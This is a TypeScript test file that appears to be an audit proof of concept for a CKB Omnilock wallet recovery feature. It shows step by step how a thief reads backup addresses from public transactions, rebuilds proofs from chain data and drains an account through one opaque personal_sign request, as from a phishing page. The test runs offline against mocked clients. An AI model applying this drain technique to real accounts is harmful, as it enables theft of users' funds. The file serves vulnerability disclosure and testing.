// Audit PoC (audit/omnilock-fable-5-1): everything a thief needs to drain a recovery account, except one signature,
// is public on chain. The backup's EVM address is in the list record of every enable/change transaction, the
// AdminList and its SMT proofs are public, and Omnilock's flag 0x12 asks the wallet to sign only the text
// "CKB transaction: 0x<sighash>", which names neither destination nor amount. A phishing page the backup wallet
// visits for any other reason can ask for exactly that signature and the funds leave to the thief's address.
import assert from "node:assert/strict";
import test from "node:test";
import * as ccc from "@ckb-ccc/core";
import { secp256k1 } from "@noble/curves/secp256k1.js";
import { keccak_256 } from "@noble/hashes/sha3.js";
import { omnilockArgsFor, secp256k1Lock } from "../src/sdk/browser/account-lock.ts";
import { backupAuth, evmOmnilockMessage, evmPersonalSignAddress, type RecoveryBackup } from "../src/sdk/browser/recovery-backups.ts";
import { decodeRecoveryList, readRecoveryList, recoveryListRecord, recoveryListRecordOf, setRecoveryListRecord } from "../src/sdk/browser/recovery-list.ts";
import { adminListData, whitelistTree } from "../src/sdk/browser/recovery-smt.ts";
import { signRecoverySpendWithEvm } from "../src/sdk/browser/recovery-spend.ts";

const CKB = 100_000_000n;
const TYPE_ID = "0x00000000000000000000000000000000000000000000000000545950455f4944";
const publicKey = ccc.hexFrom(secp256k1.getPublicKey(secp256k1.utils.randomSecretKey(), true));
const backupKey = secp256k1.utils.randomSecretKey();
const backupAddress = ccc.hexFrom(keccak_256(secp256k1.getPublicKey(backupKey, false).slice(1)).slice(12));
const thiefLock = ccc.Script.from({ codeHash: `0x${"9b".repeat(32)}`, hashType: "type", args: `0x${"ab".repeat(20)}` });

async function offlineClient(cells: ccc.Cell[], transactions: ccc.Transaction[] = []): Promise<ccc.Client> {
  const client = new ccc.ClientPublicTestnet({ url: "https://testnet.ckb.dev/" });
  await client.cache.recordCells(cells);
  Object.assign(client, {
    findSingletonCellByType: async (type: ccc.ScriptLike) => cells.find((cell) => cell.cellOutput.type?.eq(ccc.Script.from(type))),
    getTransaction: async (hash: ccc.HexLike) => {
      const transaction = transactions.find((candidate) => candidate.hash() === ccc.hexFrom(hash));
      return transaction ? { transaction, status: "committed" } : undefined;
    },
    findCells: async function* () {},
    findCellsByLock: async function* (lock: ccc.ScriptLike) {
      for (const cell of cells) if (cell.cellOutput.lock.eq(ccc.Script.from(lock))) yield cell;
    },
  });
  return client;
}

test("PoC: one personal_sign of an opaque 83-byte text, requested by any page, moves everything to the thief", async () => {
  const base = await offlineClient([]);
  const backups: RecoveryBackup[] = [{ kind: "evm", address: backupAddress }];
  const adminType = ccc.Script.from({ codeHash: TYPE_ID, hashType: "type", args: ccc.hexFrom(new Uint8Array(32).fill(0x42)) });
  const lock = await ccc.Script.fromKnownScript(base, ccc.KnownScript.OmniLock, omnilockArgsFor(publicKey, adminType.hash()));
  const { root } = whitelistTree(await Promise.all(backups.map((backup) => backupAuth(base, backup))));
  const enable = ccc.Transaction.from({ outputs: [{ lock, type: adminType, capacity: 197n * CKB }], outputsData: [adminListData(root)] });
  setRecoveryListRecord(enable, 0, await recoveryListRecord(base, backups));
  const adminList = ccc.Cell.from({ outPoint: { txHash: enable.hash(), index: 0 }, cellOutput: enable.outputs[0], outputData: enable.outputsData[0] });
  const funds = ccc.Cell.from({ outPoint: { txHash: `0x${"01".repeat(32)}`, index: 0 }, cellOutput: { lock, capacity: 10_000n * CKB }, outputData: "0x" });
  const client = await offlineClient([adminList, funds], [enable]);

  // 1. The thief learns which EVM wallets are backups of which accounts by reading enable transactions.
  const record = recoveryListRecordOf(enable, 0)!;
  const listed = await decodeRecoveryList(client, record);
  assert.deepEqual(listed.map(({ backup }) => backup), [{ kind: "evm", address: backupAddress }]);

  // 2. The thief rebuilds the list and the proof from the chain, as the rescue page does, and builds a drain.
  const list = await readRecoveryList(client, { adminListTypeArgs: adminType.args });
  const drain = ccc.Transaction.from({ inputs: [{ previousOutput: funds.outPoint }], outputs: [{ lock: thiefLock, capacity: 9_999n * CKB }], outputsData: ["0x"] });

  // 3. The backup wallet, on the thief's page, is asked to sign this and only this.
  const requests: string[] = [];
  const wallet = {
    request: async ({ method, params }: { method: string; params?: unknown[] }) => {
      if (method !== "personal_sign") throw new Error(method);
      const bytes = ccc.bytesFrom(params![0] as string);
      requests.push(new TextDecoder().decode(bytes));
      const digest = keccak_256(ccc.bytesConcat(new TextEncoder().encode(`\x19Ethereum Signed Message:\n${bytes.length}`), bytes));
      const raw = secp256k1.sign(digest, backupKey, { prehash: false, format: "recovered" });
      return ccc.hexFrom(ccc.bytesConcat(raw.slice(1), [raw[0] + 27]));
    },
  };
  const signed = await signRecoverySpendWithEvm(drain, { client, lock, list: list.entries, entry: list.entries[0], adminList: adminList.outPoint }, wallet);

  assert.equal(requests.length, 1);
  assert.match(requests[0], /^CKB transaction: 0x[0-9a-f]{64}$/, "no destination, amount, account or app name in what the wallet shows");
  // The text is the group's sighash (witness lock zeroed at its final length), as Omnilock computes it.
  const witnessArgs = signed.getWitnessArgsAt(0)!;
  const zeroed = signed.clone();
  zeroed.setWitnessArgsAt(0, ccc.WitnessArgs.from({ ...witnessArgs, lock: ccc.hexFrom(new Uint8Array(ccc.bytesFrom(witnessArgs.lock!).length)) }));
  assert.equal(requests[0], evmOmnilockMessage((await zeroed.getSignHashInfo(lock, client))!.message));
  // The signature recovers to the backup over exactly that message, so Omnilock (flag 0x12) accepts it.
  const witness = ccc.bytesFrom(witnessArgs.lock!);
  const signature = ccc.hexFrom(witness.slice(16 + 4, 16 + 4 + 65));
  assert.equal(evmPersonalSignAddress(requests[0], signature), backupAddress);
  assert.ok(signed.outputs[0].lock.eq(thiefLock));
});
